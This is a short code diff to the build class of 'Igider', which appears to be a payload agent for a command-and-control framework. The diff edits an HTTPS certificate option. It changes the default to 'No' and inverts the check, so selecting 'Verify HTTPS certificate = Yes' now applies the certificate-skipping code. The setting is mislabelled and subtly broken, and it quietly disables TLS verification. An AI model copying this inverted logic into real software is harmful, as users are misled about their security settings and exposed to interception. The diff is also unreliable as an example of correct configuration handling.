@@ -58,9 +58,9 @@ class Igider(PayloadType):
         BuildParameter(
             name="https_check",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Verify HTTPS certificate (if HTTP, leave yes)",
+            description="Verify HTTPS certificate",
             choices=["Yes", "No"],
-            default_value="Yes"
+            default_value="No"
         )
     ]
     
@@ -502,7 +502,7 @@ class Igider(PayloadType):
                 base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
             
             # Configure HTTPS certificate validation
-            if self.get_parameter("https_check") == "No":
+            if self.get_parameter("https_check") == "Yes":
                 base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                 base_code = base_code.replace("#CERTSKIP", 
                 """
